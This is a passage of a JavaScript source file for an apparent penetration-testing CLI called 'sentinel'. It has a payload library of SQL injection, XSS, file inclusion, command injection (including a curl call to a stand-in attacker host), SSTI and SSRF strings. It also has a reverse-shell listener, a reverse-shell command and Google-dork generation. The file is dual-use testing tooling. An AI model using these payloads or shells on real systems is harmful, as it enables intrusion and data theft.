    if (!name) { console.log("  " + red("usage: sentinel setup <tool>   e.g. sentinel setup nmap")); return resolve(); }
    const t = TOOLS.find((x) => x[0].toLowerCase() === String(name).toLowerCase());
    if (!t) { console.log("  " + red("unknown tool. see: sentinel tools")); return resolve(); }
    let inst = t[2];
    if (process.platform !== "win32" && inst.startsWith("sudo ") && process.getuid && process.getuid() !== 0 && process.env.SENTINEL_NO_PKEXEC !== "1") {
      // prefer a graphical prompt if available, else sudo will prompt in the terminal
    }
    h1("Configuring " + t[0]);
    console.log("  " + gray("first-time setup, this can take a few minutes...") + "\n  " + gray(inst) + "\n");
    const p = spawn(process.platform === "win32" ? "cmd.exe" : "/bin/bash", process.platform === "win32" ? ["/c", inst] : ["-lc", inst], { stdio: "inherit" });
    p.on("close", (code) => { console.log("\n  " + (code === 0 ? ok(t[0] + " is ready.") : red("setup exited with code " + code))); resolve(); });
    p.on("error", (e) => { console.log("  " + red("error: " + e.message)); resolve(); });
  });
}

// ---------- practice targets ----------
const PRACTICE = [
  ["dvwa", "DVWA", "SQLi / XSS / CSRF / command injection / file upload", "docker run --rm -it -p 4280:80 vulnerables/web-dvwa", "http://localhost:4280", "admin / password (then Setup > Create Database)"],
  ["juice", "OWASP Juice Shop", "OWASP Top 10 · modern JS · CTF-style", "docker run --rm -p 3000:3000 bkimminich/juice-shop", "http://localhost:3000", "register your own account"],
  ["webgoat", "OWASP WebGoat", "guided lessons · Java", "docker run --rm -p 8080:8080 -p 9090:9090 webgoat/webgoat", "http://localhost:8080/WebGoat", "register on first run"],
  ["bwapp", "bWAPP", "100+ bugs · PHP", "docker run --rm -p 8081:80 raesene/bwapp", "http://localhost:8081/install.php", "bee / bug (run /install.php once)"],
  ["mutillidae", "Mutillidae II (NOWASP)", "OWASP Top 10 · hints", "docker run --rm -p 8082:80 citizenstig/nowasp", "http://localhost:8082", "no login required"],
];
function labList() {
  h1("Practice targets");
  console.log("  " + gray("deliberately vulnerable apps — run locally with Docker. use only on systems you own.") + "\n");
  PRACTICE.forEach(([id, name, focus, cmd, url, creds]) => {
    console.log("  " + bold(cyan(id.padEnd(12))) + name);
    console.log("  " + " ".repeat(12) + gray(focus));
    console.log("  " + " ".repeat(12) + cmd);
    console.log("  " + " ".repeat(12) + gray("url ") + url + "   " + gray("login ") + creds + "\n");
  });
  console.log("  " + gray("tip: ") + "sentinel lab <id>" + gray("  prints one target's launch command"));
}
function labOne(id) {
  const t = PRACTICE.find((x) => x[0] === String(id).toLowerCase());
  if (!t) { console.log("  " + red("unknown target — try: " + PRACTICE.map((x) => x[0]).join(", "))); return; }
  h1(t[1]);
  console.log("  focus   " + t[2]);
  console.log("  launch  " + bold(t[3]));
  console.log("  url     " + t[4]);
  console.log("  login   " + t[5]);
}

// ---------- payload library ----------
const PAYLOADS_CLI = {
  sqli: ["' OR '1'='1", "' OR 1=1-- -", "admin'-- -", "' UNION SELECT NULL-- -", "1' AND SLEEP(5)-- -", "') OR ('1'='1", "'; DROP TABLE users-- -"],
  xss: ["<script>alert(1)</script>", "\"><svg onload=alert(1)>", "<img src=x onerror=alert(1)>", "javascript:alert(document.domain)", "'\"><script>alert(document.cookie)</script>"],
  lfi: ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ", "....//....//etc/passwd"],
  cmdi: ["; id", "| id", "$(id)", "`id`", "&& whoami", "; cat /etc/passwd", "$(curl http://ATTACKER)"],
  ssti: ["{{7*7}}", "${7*7}", "#{7*7}", "{{config}}", "<%= 7*7 %>", "{{''.__class__.__mro__[1].__subclasses__()}}"],
  ssrf: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80", "file:///etc/passwd", "gopher://127.0.0.1:6379/_", "http://[::1]/"],
};
function printPayloads(cls) {
  if (cls && PAYLOADS_CLI[cls]) { h1("Payloads · " + cls); PAYLOADS_CLI[cls].forEach((p) => console.log("  " + p)); return; }
  if (cls) { console.log("  " + red("unknown class — try: " + Object.keys(PAYLOADS_CLI).join(", "))); return; }
  h1("Payload library");
  console.log("  " + gray("classes: " + Object.keys(PAYLOADS_CLI).join(", ")) + "\n");
  Object.entries(PAYLOADS_CLI).forEach(([k, arr]) => { console.log("  " + bold(cyan(k))); arr.forEach((p) => console.log("    " + p)); console.log(""); });
  console.log("  " + gray("for authorized testing only."));
}

// ---------- utilities: password gen, public IP, HTTP status ----------
function genPass(len) {
  len = Math.max(8, Math.min(128, parseInt(len, 10) || 20));
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*-_=+";
  const bytes = crypto.randomBytes(len); let out = "";
  for (let i = 0; i < len; i++) out += chars[bytes[i] % chars.length];
  return out;
}
async function myIp() {
  const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 8000);
  try { const r = await fetch("https://api.ipify.org?format=json", { signal: ctrl.signal }); const d = await r.json(); return d.ip || "(unknown)"; }
  catch (e) { return "error: " + (e.name === "AbortError" ? "timed out" : e.message); }
  finally { clearTimeout(t); }
}
const HTTP_STATUS_MAP = { "200": "OK", "201": "Created", "202": "Accepted", "204": "No Content", "206": "Partial Content", "301": "Moved Permanently", "302": "Found", "303": "See Other", "304": "Not Modified", "307": "Temporary Redirect", "308": "Permanent Redirect", "400": "Bad Request", "401": "Unauthorized", "402": "Payment Required", "403": "Forbidden", "404": "Not Found", "405": "Method Not Allowed", "406": "Not Acceptable", "407": "Proxy Authentication Required", "408": "Request Timeout", "409": "Conflict", "410": "Gone", "413": "Payload Too Large", "414": "URI Too Long", "418": "I'm a teapot", "422": "Unprocessable Entity", "425": "Too Early", "429": "Too Many Requests", "431": "Request Header Fields Too Large", "451": "Unavailable For Legal Reasons", "500": "Internal Server Error", "501": "Not Implemented", "502": "Bad Gateway", "503": "Service Unavailable", "504": "Gateway Timeout", "505": "HTTP Version Not Supported" };
function httpStatus(code) { code = String(code || "").trim(); const t = HTTP_STATUS_MAP[code]; if (!t) return red("unknown status code (try 200, 404, 500...)"); const n = +code; const cls = n < 200 ? "1xx informational" : n < 300 ? "2xx success" : n < 400 ? "3xx redirect" : n < 500 ? "4xx client error" : n < 600 ? "5xx server error" : ""; return bold(cyan(code)) + " " + t + (cls ? gray("  · " + cls) : ""); }

async function mainMenu() {
  banner();
  const items = [
    ["1", "Port scanner", menuScan],
    ["2", "DNS lookup", menuDns],
    ["3", "WHOIS", menuWhois],
    ["4", "HTTP security headers", menuHeaders],
    ["5", "TLS certificate", menuCert],
    ["6", "Subdomains (crt.sh)", menuSubs],
    ["v", "CVE search (NVD)", async () => { h1("CVE search"); const q = await ask("keyword / CVE-id:"); console.log(""); await cveSearch(q); }],
    ["f", "Content fuzzer", async () => { h1("Content fuzzer"); const u = await ask("url:"); console.log(""); await fuzz(u); }],
    ["7", "Reverse shell generator", menuShell],
    ["8", "Encode / decode / hash", menuEncode],
    ["9", "Payload builders", menuPayloads],
    ["p", "Payload library", async () => { const c = await ask("class (blank = all):"); console.log(""); printPayloads(c || undefined); }],
    ["l", "Practice targets", async () => labList()],
    ["x", "Password generator", async () => { const n = await ask("length (blank = 20):"); h1("Generated password"); console.log("  " + bold(genPass(n))); }],
    ["i", "My public IP", async () => { h1("Public IP"); console.log("  " + await myIp()); }],
    ["g", "GitHub (clone / push)", menuGit],
    ["c", "Cheat sheets", menuCheats],
    ["a", "Nexus — AI coder (local Ollama)", async () => aiCoder("")],
    ["t", "Tools catalog", async () => listTools()],
    ["0", "Exit", null],
  ];
  while (true) {
    console.log("");
    items.forEach(([k, label]) => console.log("  " + cyan("[" + k + "]") + " " + label));
    const choice = await ask("\n  select:");
    const item = items.find((i) => i[0] === choice);
    if (!item) { console.log("  " + red("invalid choice")); continue; }
    if (item[0] === "0") { console.log("\n  " + gray("stay sharp.") + "\n"); process.exit(0); }
    try { await item[2](); } catch (e) { console.log("  " + red("error: " + e.message)); }
    await ask("\n  " + gray("[enter] menu"));
    console.clear();
    banner();
  }
}

// ---------- extra utilities ----------
function cidr(input) {
  const c = cidrCalc(input);
  if (!c) { console.log(red("usage: sentinel cidr 192.168.1.0/24")); return; }
  h1("CIDR " + input);
  console.log("  Network    " + cyan(c.network));
  console.log("  Broadcast  " + cyan(c.broadcast));
  console.log("  Netmask    " + c.netmask);
  console.log("  Usable     " + c.firstUsable + "  -  " + c.lastUsable);
  console.log("  Hosts      " + green(String(c.hosts)));
}
function jwtDecode(tok) {
  const a = analyzeJwt(tok);
  if (!a) { console.log(red("not a valid JWT (expected header.payload[.signature])")); return; }
  h1("JWT");
  console.log(gray("// header")); console.log(JSON.stringify(a.header, null, 2));
  console.log(gray("\n// payload")); console.log(JSON.stringify(a.payload, null, 2));
  const humanT = (t) => { const c = epochConvert(String(t)); return c ? c.iso.replace(/\.000Z$/, "Z") : String(t); };
  const times = []; if (a.iat != null) times.push("iat " + humanT(a.iat)); if (a.nbf != null) times.push("nbf " + humanT(a.nbf)); if (a.exp != null) times.push("exp " + humanT(a.exp));
  if (times.length) console.log(gray("\n// times: ") + times.join(gray("  ·  ")));
  const sc = (a.state === "expired" || a.state === "not-yet-valid") ? red : a.state === "valid" ? green : gray;
  console.log("\n  status: " + sc(a.state.toUpperCase()) + gray("   (signature NOT verified — no key)"));
  for (const w of a.warnings) console.log("  " + yellow("warning: " + w));
  if (a.signature) console.log(gray("\nsignature: ") + a.signature);
}
async function ipInfo(ip) {
  const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 8000);
  try {
    const r = await fetch("http://ip-api.com/json/" + encodeURIComponent(ip || ""), { signal: ctrl.signal });
    const d = await r.json();
    if (d.status !== "success") { console.log(red(d.message || "lookup failed")); return; }
    h1("IP " + d.query);
    [["Location", [d.city, d.regionName, d.country].filter(Boolean).join(", ")], ["ISP", d.isp], ["Org", d.org], ["AS", d.as], ["Coords", d.lat + "," + d.lon], ["Timezone", d.timezone]].forEach(([k, v]) => v && console.log("  " + k.padEnd(10) + cyan(v)));
  } catch (e) { console.log(red("error: " + (e.name === "AbortError" ? "timed out" : e.message))); }
  finally { clearTimeout(t); }
}
function dorks(domain) {
  if (!domain) { console.log(red("usage: sentinel dorks example.com")); return; }
  const D = [["exposed files", 'intitle:"index of"'], ["config/env", "ext:env | ext:ini | ext:conf"], ["SQL dumps", "ext:sql"], ["login pages", "inurl:login | inurl:admin"], ["docs", "ext:pdf | ext:xls | ext:docx"], ["errors", 'intext:"sql syntax near"'], ["backups", "ext:bak | ext:old | ext:backup"]];
  h1("Google dorks for " + domain);
  D.forEach(([label, q]) => { console.log("  " + bold(label)); console.log("  " + gray("https://www.google.com/search?q=") + encodeURIComponent("site:" + domain + " " + q) + "\n"); });
}
function fileHash(f) {
  try { const buf = require("fs").readFileSync(f); h1("Hashes of " + f); ["md5", "sha1", "sha256", "sha512"].forEach((a) => console.log("  " + a.padEnd(8) + cyan(crypto.createHash(a).update(buf).digest("hex")))); }
  catch (e) { console.log(red("error: " + e.message)); }
}
function serveDir(port, dir) {
  port = parseInt(port, 10) || 8000; dir = dir || ".";
  const fs = require("fs"), path = require("path");
  const srv = http.createServer((req, res) => {
    let p = path.join(dir, decodeURIComponent(req.url.split("?")[0]));
    if (!path.resolve(p).startsWith(path.resolve(dir))) { res.writeHead(403); return res.end("forbidden"); }
    fs.stat(p, (e, st) => {
      if (e) { res.writeHead(404); return res.end("not found"); }
      if (st.isDirectory()) { const items = fs.readdirSync(p); res.writeHead(200, { "Content-Type": "text/html" }); return res.end(items.map((i) => `<a href="${req.url.replace(/\/$/, "")}/${i}">${i}</a>`).join("<br>")); }
      console.log("  " + green("GET ") + req.url + gray("  " + (req.socket.remoteAddress || "")));
      res.writeHead(200); fs.createReadStream(p).pipe(res);
    });
  });
  srv.listen(port, () => { h1("HTTP file server"); console.log("  serving " + bold(path.resolve(dir)) + " on " + cyan("http://0.0.0.0:" + port)); console.log("  " + gray("Ctrl-C to stop") + "\n"); });
}
function listen(port) {
  port = parseInt(port, 10) || 4444;
  h1("Listener on :" + port);
  console.log("  " + gray("waiting for a connection (catch a reverse shell)... Ctrl-C to quit") + "\n");
  const srv = net.createServer((sock) => {
    console.log("  " + green("connection from ") + (sock.remoteAddress || "") + ":" + sock.remotePort + "\n");
    process.stdin.setRawMode && process.stdin.setRawMode(true); process.stdin.resume();
    sock.pipe(process.stdout); process.stdin.pipe(sock);
    sock.on("close", () => { console.log("\n  " + gray("connection closed")); process.exit(0); });
    sock.on("error", () => {});
  });
  srv.listen(port);
}

// ---------- one-shot CLI ----------
async function cli(args) {
  const [cmd, ...rest] = args;
  if (cmd === "scan") { const host = rest[0]; if (!host) return usage(); await scan(host, parsePorts(rest[1])); }
  else if (cmd === "dns") { const recs = await dnsLookup(rest[0] || ""); recs.forEach(([k, v]) => console.log(k.padEnd(6) + v)); }
  else if (cmd === "whois") { console.log(await whois(rest[0] || "")); }
  else if (cmd === "headers") { const r = await headers(rest[0] || ""); if (r.err) { console.log(r.err); return; } console.log(r.status + " server:" + r.server); SEC.forEach(([k, label]) => console.log((r.h[k] !== undefined ? "[+] " : "[-] ") + label)); }
  else if (cmd === "cert") { const c = await certInspect(rest[0] || ""); if (!c.ok) { console.log(c.error); return; } console.log("Protocol " + c.protocol + " " + c.cipher); console.log("Subject  " + c.subject); console.log("Issuer   " + c.issuer); console.log("Valid    " + c.valid_from + " -> " + c.valid_to + (c.daysLeft != null ? " (" + c.daysLeft + "d left)" : "")); console.log("SAN      " + c.san); console.log("SHA-256  " + c.fp); }
  else if (cmd === "subs") { const r = await subs(rest[0] || ""); if (r.err) { console.log(r.err); return; } r.forEach((s) => console.log(s)); }
  else if (cmd === "cve") await cveSearch(rest.join(" "));
  else if (cmd === "fuzz") await fuzz(rest[0], rest[1]);
  else if (cmd === "git") {
    const sub = rest[0];
    if (sub === "clone") await gitClone(rest[1] || "");
    else if (sub === "push") await gitPush(rest.slice(1).join(" "));
    else if (sub === "pull") await gitPull();
    else if (sub === "status") await gitStatus();
    else if (sub === "repos") await ghReposList();
    else if (sub === "new") await ghNewRepo(rest[1]);
    else if (sub === "branch") await gitBranches();
    else if (sub === "checkout") await gitCheckout(rest[1]);
    else if (sub === "log") await gitLog();
    else if (sub === "diff") await gitDiff(rest[1]);
    else if (sub === "issues") await ghIssues(rest[1], "issues");
    else if (sub === "prs") await ghIssues(rest[1], "pulls");
    else if (sub === "issue") await ghNewIssue(rest[1], rest[2], rest.slice(3).join(" "));
    else if (sub === "pr") await ghNewPR(rest[1], rest[2]);
    else if (sub === "comment") await ghComment(rest[1], rest[2], rest.slice(3).join(" "));
    else if (sub === "gists") await ghGists();
    else if (sub === "gist") await ghNewGist(rest[1], rest.slice(2).join(" "));
    else console.log("git clone|push|pull|status|log|diff|branch|checkout|repos|new|issues|prs|issue|pr|comment|gists|gist  (token: SENTINEL_GH_TOKEN)");
  }
  else if (cmd === "revshell") { const [lang = "bash", ip = "10.0.0.1", port = "4444"] = rest; console.log((SHELLS[lang] || SHELLS.bash)(ip, port)); }
  else if (cmd === "encode" || cmd === "decode") { const [type, ...v] = rest; const op = (type || "") + (cmd === "encode" ? "e" : "d"); const fn = ENC[op]; console.log(fn ? fn(v.join(" ")) : "unknown type (b64|hex|url|base32)"); }
  else if (cmd === "defang") { const t = rest.join(" "); console.log(t ? defang(t) : red("usage: sentinel defang <url|ip|email>  — neutralize an IOC for safe pasting")); }
  else if (cmd === "refang") { const t = rest.join(" "); console.log(t ? refang(t) : red("usage: sentinel refang <defanged text>  — reverse defang")); }
  else if (cmd === "port") { const r = portLookup(rest[0]); if (!r) { console.log(red("usage: sentinel port <number|service>   e.g. sentinel port 3306  ·  sentinel port redis")); } else if (r.kind === "port") { console.log("  " + bold(cyan(String(r.port))) + "  " + (r.service ? r.service : gray("no well-known service"))); } else { if (!r.ports.length) console.log("  " + gray("no well-known port matches ") + r.name); else r.ports.forEach((p) => console.log("  " + bold(cyan(String(p))).padEnd(20) + SERVICES[p])); } }
  else if (cmd === "useragent" || cmd === "ua") { const u = parseUA(rest.join(" ")); if (!u) { console.log(red("usage: sentinel useragent <ua-string>   — parse browser/OS/device")); } else { h1("User-Agent"); const row = (k, v) => console.log("  " + k.padEnd(9) + v); row("browser", cyan(u.browser + (u.version ? " " + u.version : ""))); row("os", cyan(u.os)); row("device", u.device); row("bot", u.bot ? yellow("yes") : "no"); console.log(); } }
  else if (cmd === "totp") { const secret = rest.join(" ").replace(/\s+/g, ""); const code = totp(secret); if (!code) { console.log(red("usage: sentinel totp <base32-secret>   — generate a TOTP 2FA code")); } else { console.log(bold(cyan(code))); const left = secondsRemaining(30); console.log(gray("  valid " + left + "s" + (left <= 5 ? " (expiring — a new code is imminent)" : ""))); } }
  else if (cmd === "url") { const u = parseUrl(rest.join(" ")); if (!u) { console.log(red("usage: sentinel url <url>   e.g. sentinel url https://host.com:8443/a?x=1#f")); } else { h1("URL"); const row = (k, v) => { if (v !== "" && v != null) console.log("  " + k.padEnd(10) + cyan(v)); }; row("scheme", u.scheme); row("host", u.host); row("port", u.port); row("path", u.path); row("fragment", u.fragment); if (u.username) row("user", u.username); if (u.password) row("pass", u.password); const keys = Object.keys(u.params); if (keys.length) { console.log("  " + gray("query params:")); keys.forEach((k) => console.log("    " + k.padEnd(14) + cyan(u.params[k]))); } console.log(); } }
  else if (cmd === "incidr" || cmd === "inrange") { const r = inCidr(rest[0], rest[1]); if (r === null) console.log(red("usage: sentinel incidr <ip> <cidr>   e.g. sentinel incidr 10.0.0.5 10.0.0.0/24")); else console.log(r ? green("  yes") + gray(" — " + rest[0] + " is inside " + rest[1]) : red("  no") + gray(" — " + rest[0] + " is NOT inside " + rest[1])); }
  else if (cmd === "epoch" || cmd === "time" || cmd === "ts") { const t = rest.join(" ").trim() || String(Math.floor(Date.now() / 1000)); const c = epochConvert(t); if (!c) { console.log(red("usage: sentinel epoch <unix-ts | ISO date>   (no arg = now)")); } else { h1("timestamp  (" + c.from + ")"); console.log("  epoch (s)   " + cyan(String(c.epochSeconds))); console.log("  epoch (ms)  " + String(c.epochMs)); console.log("  ISO 8601    " + cyan(c.iso)); console.log("  UTC         " + c.utc + "\n"); } }
  else if (cmd === "entropy") { const t = rest.join(" "); if (!t) { console.log(red("usage: sentinel entropy <string>  — Shannon entropy (flags likely secrets)")); } else { const a = entropyAssess(t); const c = a.level === "high" ? red : a.level === "medium" ? yellow : green; console.log("  " + c(a.bitsPerChar.toFixed(2) + " bits/char") + gray("  ·  " + a.totalBits.toFixed(0) + " bits over " + a.length + " chars  ·  ") + c(a.level) + (a.likelySecret ? red("  (likely a secret/key)") : "")); } }
  else if (cmd === "hash") console.log(hashes(rest.join(" ")));
  else if (cmd === "hashid") console.log(idHash(rest.join(" ")));
  else if (cmd === "lab") { if (rest[0]) labOne(rest[0]); else labList(); }
  else if (cmd === "payloads") printPayloads(rest[0]);
  else if (cmd === "genpass") console.log(genPass(rest[0]));
  else if (cmd === "myip") console.log(await myIp());
  else if (cmd === "status") console.log(httpStatus(rest[0]));
  else if (cmd === "cidr") cidr(rest[0]);
  else if (cmd === "jwt") jwtDecode(rest[0]);
  else if (cmd === "ipinfo") await ipInfo(rest[0] || "");
  else if (cmd === "dorks") dorks(rest[0]);
  else if (cmd === "hashfile") fileHash(rest[0]);
  else if (cmd === "uuid") console.log(crypto.randomUUID());
  else if (cmd === "serve") { serveDir(rest[0], rest[1]); await new Promise(() => {}); }
  else if (cmd === "listen") { listen(rest[0]); await new Promise(() => {}); }
  else if (cmd === "cheats") { const t = rest[0]; if (t && CHEATS[t]) CHEATS[t].forEach((l) => console.log(l)); else console.log("topics: " + Object.keys(CHEATS).join(", ")); }
  else if (cmd === "tools") { h1("Tools"); TOOLS.forEach(([n, cat, inst]) => console.log("  " + bold(n.padEnd(14)) + gray(cat.padEnd(10)) + (inst.split(" ").slice(0,3).join(" ")))); console.log("\n  " + gray("configure any tool with: ") + "sentinel setup <name>"); }
  else if (cmd === "setup") await setupTool(rest[0]);
  else if (cmd === "init") nexusInit();
  else if (cmd === "docs" || cmd === "doc" || (cmd === "help" && rest[0])) nexusDocs(rest[0]);
  else if (cmd === "login") {
    const a0 = (rest[0] || "").toLowerCase();
    if (a0 === "--help" || a0 === "-h" || a0 === "help") loginHelp();
    else if (a0 === "config") loginConfigWrite(rest.slice(1));
    else if (a0 === "status" || a0 === "whoami") { const a = nexusAuth(); console.log(a ? "  " + green("signed in as ") + (a.name || a.email || a.uid) : "  " + gray("not signed in — paste your code: `sentinel login` (see `sentinel login --help`)")); }
    else if (["google", "g", "github", "gh"].includes(a0)) { try { await nexusLogin(a0); } catch (e) { console.log("  " + red(e.message)); } }
    else { try { const code = rest[0] || await ask("Paste your code from the website (Settings → Nexus CLI):"); await nexusLoginCode(code); } catch (e) { console.log("  " + red(e.message)); } }
  }
  else if (cmd === "logout") console.log(nexusLogout() ? "  " + green("signed out.") : "  " + gray("was not signed in."));
  else if (cmd === "whoami") { const a = nexusAuth(); console.log(a ? "  " + (a.name || a.email || a.uid) + gray("  " + String(a.provider).replace(".com", "")) : "  " + gray("not signed in")); }
  else if (cmd === "policy") {
    if (rest[0] === "init") { const fs = require("fs"), path = require("path"); const dir = path.join(process.cwd(), ".nexus"), f = path.join(dir, "policy.json"); if (fs.existsSync(f)) console.log("  " + yellow(".nexus/policy.json already exists — not overwriting")); else { fs.mkdirSync(dir, { recursive: true }); fs.writeFileSync(f, JSON.stringify(POLICY_DEFAULTS, null, 2) + "\n"); console.log("  " + green("created ") + ".nexus/policy.json" + gray(" — a starting policy; tighten protected paths, denied commands, and limits, then ") + cyan("sentinel policy") + gray(" to review")); } return; }
    const p = loadPolicy(process.cwd());
    if (rest[0] === "--json") { console.log(JSON.stringify(p, null, 2)); }
    else { banner(); h1("Effective security policy" + (p.org ? "  (ORG-ENFORCED)" : "")); const row = (k, v) => console.log("  " + k.padEnd(22) + v); row("source", p.org ? "org floor (~/.sentinel/policy.json) + local .nexus/policy.json" : ".nexus/policy.json (or defaults)"); row("protected paths", (p.protectedPaths || []).length + "  " + gray((p.protectedPaths || []).slice(0, 6).join(", ") + ((p.protectedPaths || []).length > 6 ? " …" : ""))); row("denied commands", (p.deniedCommands || []).length ? p.deniedCommands.join(", ") : gray("(built-in destructive guard only)")); row("max files / turn", p.maxFilesPerTurn || gray("unlimited")); row("block secret writes", p.blockSecrets ? green("on") : red("off")); row("network", p.allowNetwork ? "allowed" : red("blocked")); row("audit", p.audit ? "on (.nexus/audit.jsonl, hash-chained)" : gray("off")); const warns = policyWarnings(process.cwd()); if (warns.length) { console.log("\n  " + yellow("config warnings:")); warns.forEach((wn) => console.log("    " + yellow("• " + wn))); } console.log("\n  " + gray("machine-readable: ") + cyan("sentinel policy --json") + "\n"); }
  }
  else if (cmd === "audit") {
    if (rest[0] === "verify") { const v = auditVerify(process.cwd()); if (v.empty) { console.log("  " + gray("audit trail is empty — nothing to verify")); process.exit(0); } console.log(v.ok ? "  " + green("OK") + " audit trail intact — " + v.count + " record(s), hash chain verified" : "  " + red("TAMPERED") + " — " + v.reason + " at record #" + v.badLine + " of " + v.count); process.exit(v.ok ? 0 : 1); } // CI gate: non-zero exit on tamper
    else { try { const fs = require("fs"), path = require("path"); const raw = fs.readFileSync(path.join(process.cwd(), ".nexus", "audit.jsonl"), "utf8").trim().split("\n").filter(Boolean); const show = (rest[0] === "--json") ? raw.slice(-50).join("\n") : raw.slice(-20).map((l) => { try { const e = JSON.parse(l); return "  " + gray((e.ts || "").slice(0, 19).replace("T", " ")) + " " + (e.status === "blocked" ? red("blocked") : e.status === "error" ? yellow("error  ") : green("ok     ")) + " " + (e.tool || "") + gray(" " + (e.path || e.cmd || "") + (e.reason ? " — " + e.reason : "")); } catch (_) { return ""; } }).filter(Boolean).join("\n"); const v = auditVerify(process.cwd()); console.log(show + "\n  " + (v.ok ? green("chain verified (" + v.count + ")") : red("CHAIN BROKEN — sentinel audit verify"))); } catch (_) { console.log("  " + gray("no audit trail (.nexus/audit.jsonl) in this directory")); } }
  }
  else if (cmd === "doctor") {
    const reach = await ollamaReachable(), auth = nexusAuth(), warns = policyWarnings(process.cwd()), v = auditVerify(process.cwd());
    const health = { engines: Object.fromEntries(ENGINE_ORDER.map((e) => [e, engineAvail(e)])), ollamaReachable: reach, signedIn: !!auth, account: auth ? (auth.name || auth.email || auth.uid) : null, policyValid: warns.length === 0, policyWarnings: warns, audit: v.empty ? "empty" : v.ok ? "intact" : "tampered", auditCount: v.count || 0 };
    const problem = warns.length || (v.ok === false);
    health.healthy = !problem;
    if (rest[0] === "--json") { console.log(JSON.stringify(health, null, 2)); process.exit(problem ? 1 : 0); }
    banner(); h1("Nexus doctor");
    console.log("  " + bold("AI engines") + gray("  (● installed)"));
    for (const e of ENGINE_ORDER) { const on = engineAvail(e); console.log("    " + (on ? green("●") : gray("○")) + " " + e.padEnd(9) + gray(ENGINES[e].label) + (!on && ENGINES[e].install ? gray("  — install: ") + cyan(ENGINES[e].install) : "")); }
    console.log("    " + (reach ? green("●") : yellow("○")) + " " + "ollama".padEnd(9) + gray(reach ? "server reachable" : "server not reachable — start Ollama or run `sentinel nexus setup`"));
    console.log("\n  " + bold("Account") + "  " + (auth ? green("signed in ") + gray("as " + health.account) : gray("not signed in — `sentinel login`")));
    console.log("\n  " + bold("Security policy") + "  " + (warns.length ? yellow(warns.length + " warning(s)") : green("valid")));
    warns.forEach((w) => console.log("    " + yellow("• " + w)));
    console.log("\n  " + bold("Audit trail") + "  " + (v.empty ? gray("empty (no enforced actions yet)") : v.ok ? green("intact") + gray(" — " + v.count + " records, hash chain verified") : red("TAMPERED") + " — " + v.reason));
    console.log("\n  " + (problem ? yellow("some checks need attention") : green("all systems healthy")) + gray("   (machine-readable: sentinel doctor --json)") + "\n");
    process.exit(problem ? 1 : 0);
  }
  else if (cmd === "nexus" || cmd === "code" || cmd === "ai") {
    const sub = (rest[0] || "").toLowerCase();
    if (sub === "init") nexusInit();
    else if (sub === "docs" || sub === "doc") nexusDocs(rest[1]);
    else if (sub === "setup") await nexusSetup({ ask, auto: rest.includes("-y") || rest.includes("--yes") });
    else if (sub === "login") { try { await nexusLogin(rest[1] || "github"); } catch (e) { console.log("  " + red(e.message)); } }
    else if (sub === "run" || sub === "supervise" || sub === "loop") await nexusRun(rest.slice(1));
    else if (sub === "overnight") await nexusRun(["--overnight"].concat(rest.slice(1)));
    else if (sub === "agents" || sub === "parallel") await nexusAgents(rest.slice(1));
    else {
      // First launch on a real terminal: offer the one-time Ollama/Claude setup before the TUI.
      if (process.stdout.isTTY && !rest.includes("--print") && firstRunPending()) { try { await nexusSetup({ ask, auto: rest.includes("-y") || rest.includes("--yes") }); } catch (_) {} }
      await aiCoder(rest);
    }
  }
  else usage();
}

// ========== global config, auth (Firebase-backed /login) & first-run setup ==========
// Nexus keeps machine-wide state (login tokens, Firebase keys, setup marker) in
// ~/.sentinel/ so a signed-in session and installed models persist across every
// project, unlike the per-project .nexus/ dir.
function sentinelHome() { const os = require("os"), path = require("path"), fs = require("fs"); const d = path.join(os.homedir(), ".sentinel"); try { fs.mkdirSync(d, { recursive: true }); } catch (_) {} return d; }
function readGlobal(name, def) { const fs = require("fs"), path = require("path"); try { return JSON.parse(fs.readFileSync(path.join(sentinelHome(), name), "utf8")); } catch (_) { return def === undefined ? null : def; } }
function writeGlobal(name, obj) { const fs = require("fs"), path = require("path"); try { const p = path.join(sentinelHome(), name); fs.writeFileSync(p, JSON.stringify(obj, null, 2)); try { fs.chmodSync(p, 0o600); } catch (_) {} return true; } catch (_) { return false; } } // 0600: tokens are secrets

// Minimal dependency-free HTTP(S) JSON client (the whole CLI ships with zero deps).
function httpReq(opts) {
  return new Promise((resolve, reject) => {
    let u; try { u = new URL(opts.url); } catch (e) { return reject(e); }
    const lib = u.protocol === "http:" ? require("http") : require("https");
    const data = opts.body == null ? null : (typeof opts.body === "string" ? opts.body : JSON.stringify(opts.body));
    const headers = Object.assign({}, opts.headers || {});
    if (data != null && headers["Content-Length"] == null) headers["Content-Length"] = Buffer.byteLength(data);
    const req = lib.request({ hostname: u.hostname, port: u.port || (u.protocol === "http:" ? 80 : 443), path: u.pathname + u.search, method: opts.method || "GET", headers }, (res) => {
      let d = ""; res.on("data", (c) => (d += c)); res.on("end", () => { let j = null; try { j = JSON.parse(d); } catch (_) {} resolve({ status: res.statusCode, text: d, json: j }); });
    });
    req.on("error", reject); req.setTimeout(opts.timeout || 30000, () => req.destroy(new Error("request timed out")));
    if (data != null) req.write(data); req.end();
  });
}
function openBrowser(url) {
  const cp = require("child_process"), p = process.platform;
  try {
    if (p === "win32") cp.spawn("cmd", ["/c", "start", "", url], { stdio: "ignore", detached: true }).unref();
    else cp.spawn(p === "darwin" ? "open" : "xdg-open", [url], { stdio: "ignore", detached: true }).unref();
  } catch (_) {}
}

// ---- Firebase Identity Toolkit REST (verifies the user against the project) ----
// Bundled PUBLIC config for the Sentinel web project — a Firebase web apiKey only
// identifies the project, it is not a secret (it ships in the website's JS too).
// This makes `sentinel login` work out-of-the-box with the website's accounts; a
// ~/.sentinel/firebase.json overrides any field (e.g. to point at your own project).
const DEFAULT_FIREBASE = { apiKey: "AIzaSyD3CJO7PLQdRvPOWDqehSlRwEeA5odCTDE", authDomain: "sentinel-b4194.firebaseapp.com", projectId: "sentinel-b4194" };
function firebaseCfg() { return Object.assign({}, DEFAULT_FIREBASE, readGlobal("firebase.json", {}) || {}); }
function firebaseReady(c) { c = c || firebaseCfg(); return !!(c && c.apiKey); }
async function firebaseSignInWithIdp(providerId, idpToken) {
  const c = firebaseCfg(); if (!c.apiKey) throw new Error("no Firebase apiKey configured");
